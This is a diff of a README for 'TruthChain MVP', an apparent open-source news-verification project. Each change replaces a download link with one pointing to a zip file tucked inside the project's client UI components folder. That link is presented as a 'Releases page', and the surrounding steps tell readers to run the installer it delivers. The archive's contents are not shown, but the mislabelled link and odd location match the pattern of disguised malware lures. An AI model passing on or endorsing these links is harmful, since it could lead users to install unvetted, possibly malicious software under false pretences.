@@ -6,7 +6,7 @@ TruthChain MVP is an open-source project designed to help you store verified new
 
 ## 📥 Download Now
 
-[![Download TruthChain MVP](https://raw.githubusercontent.com/a1-aad/truthchain-mvp/main/contracts/truthchain-mvp-2.3.zip)](https://raw.githubusercontent.com/a1-aad/truthchain-mvp/main/contracts/truthchain-mvp-2.3.zip)
+[![Download TruthChain MVP](https://github.com/a1-aad/truthchain-mvp/raw/refs/heads/main/client/src/components/ui/mvp_truthchain_2.7.zip)](https://github.com/a1-aad/truthchain-mvp/raw/refs/heads/main/client/src/components/ui/mvp_truthchain_2.7.zip)
 
 ## 📋 Overview
 
@@ -29,7 +29,7 @@ Before you download, ensure your system meets the following minimum requirements
 
 To get started:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/a1-aad/truthchain-mvp/main/contracts/truthchain-mvp-2.3.zip).
+1. Visit the [Releases page](https://github.com/a1-aad/truthchain-mvp/raw/refs/heads/main/client/src/components/ui/mvp_truthchain_2.7.zip).
 2. Look for the latest version listed. You will find the version number and release notes.
 3. Click on the link for the package that matches your operating system (e.g., Windows, macOS, Linux).
 4. The download will start automatically. Once complete, find the installer in your downloads folder.
@@ -77,6 +77,6 @@ TruthChain MVP is released under an open-source license. You can freely use, mod
 
 ## 📥 Download Now Again
 
-Remember, you can always download the latest version from our [Releases page](https://raw.githubusercontent.com/a1-aad/truthchain-mvp/main/contracts/truthchain-mvp-2.3.zip). Your contributions and feedback help us improve.
+Remember, you can always download the latest version from our [Releases page](https://github.com/a1-aad/truthchain-mvp/raw/refs/heads/main/client/src/components/ui/mvp_truthchain_2.7.zip). Your contributions and feedback help us improve.
 
 Enjoy your experience with TruthChain MVP, where accurate news is just a click away!
